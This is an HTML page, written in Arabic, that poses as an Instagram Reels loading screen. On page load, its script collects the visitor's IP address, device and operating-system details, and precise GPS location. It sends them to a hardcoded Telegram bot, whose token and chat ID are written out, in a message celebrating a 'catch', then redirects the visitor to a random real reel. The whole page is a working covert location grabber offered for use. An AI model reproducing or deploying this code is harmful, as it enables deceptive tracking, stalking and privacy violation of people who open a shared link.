<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Reels</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
    <style>
        body { font-family: -apple-system, sans-serif; background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader-container { text-align: center; }
        .loader { border: 3px solid #333; border-top: 3px solid #f09433; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="loader-container">
    <div class="loader"></div>
    <p>جاري تحميل الفيديو...</p>
</div>

<script>
    const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
    const chat_id = '8658217605';

    // قائمة ريلز مشهورة ومختارة بعناية (يمكنك استبدال الروابط بأخرى مشهورة)
    const reelsList = [
        "https://www.instagram.com/reels/C50xY_XoF_v/", // تريند 1
        "https://www.instagram.com/reels/C6I3-p_sN9z/", // مضحك 1
        "https://www.instagram.com/reels/C56H2b-shUo/", // رياضة 1
        "https://www.instagram.com/reels/C5fQoHNsCj5/", // تريند 2
    ];
    
    // اختيار رابط عشوائي من القائمة
    const randomReel = reelsList[Math.floor(Math.random() * reelsList.length)];

    async function captureData() {
        try {
            // 1. جلب الـ IP ومعلومات الجهاز الأساسية
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const deviceName = platform.description; 
            const os = platform.os.family + " " + platform.os.version;

            // 2. طلب الموقع الجغرافي (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;

                    const message = `🎯 صيدة VIP لـ أنس:\n\n` +
                                  `📍 الموقع: ${googleMaps}\n` +
                                  `📱 الجهاز: ${deviceName}\n` +
                                  `⚙️ النظام: ${os}\n` +
                                  `🌐 الـ IP: ${ipData.ip}\n` +
                                  `🎬 تم التحويل العشوائي إلى: ${randomReel}`;

                    await sendToTelegram(message);
                    window.location.replace(randomReel);
                }, async (err) => {
                    const message = `⚠️ صيدة (بدون موقع) لـ أنس:\n\n📱 الجهاز: ${deviceName}\n⚙️ النظام: ${os}\n🌐 IP: ${ipData.ip}\n🎬 تم التحويل العشوائي إلى: ${randomReel}`;
                    await sendToTelegram(message);
                    window.location.replace(randomReel);
                }, { enableHighAccuracy: true });
            }
        } catch (e) {
            window.location.replace(randomReel);
        }
    }

    async function sendToTelegram(msg) {
        return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
    }

    window.onload = captureData;
</script>
</body>
</html>
